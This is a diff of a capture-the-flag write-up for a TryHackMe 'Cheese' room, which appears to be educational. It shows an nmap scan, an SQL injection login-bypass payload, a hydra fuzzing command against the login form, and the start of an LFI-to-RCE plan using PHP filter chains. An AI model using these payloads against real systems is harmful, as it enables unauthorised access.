@@ -4,10 +4,11 @@ tags:
   - Easy
   - Linux
   - SQLi
+  - Fuzzing
+  - Auth-Bypass
   - LFI
-  - RCE
-  - Systemd
   - Sudo
+  - Systemd
   - SUID
 ---
 https://tryhackme.com/room/cheesectfv10/
@@ -19,7 +20,7 @@ Append to the `/etc/hosts` file:
 # Scanning
 The scan `nmap -p- --open -sS -vvv -n -Pn cheese.thm` reveals that many ports are open, giving false positives likely due to a security configuration. So, we will have to test manually.
 # Discovery
-There is a [login panel](http://cheese.thm/login.php) running on port 80.
+There is login panel running on port 80 at `/login.php`.
 # Exploitation
 ## SQL injection
 Hydra revealed many successful SQL injection queries like **`'||2=2#`**:
@@ -27,7 +28,7 @@ Hydra revealed many successful SQL injection queries like **`'||2=2#`**:
 hydra -L /usr/share/seclists/Fuzzing/login_bypass.txt -p password cheese.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed." -t 64
 ```
 ## LFI to RCE
-Admin panel is vulnerable to local file inclusion via `file` parameter: http://cheese.thm/secret-script.php?file=supersecretadminpanel.html.
+Admin panel is vulnerable to local file inclusion via `file` parameter at `/secret-script.php?file=supersecretadminpanel.html`.
 
 The readable files are very restricted, so we will use PHP wrappers and filters to get from [LFI to RCE](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html). First, clone a [repository](https://github.com/tucommenceapousser/php_filter_chain_generator) to generate **PHP filter chains**:
 ```console
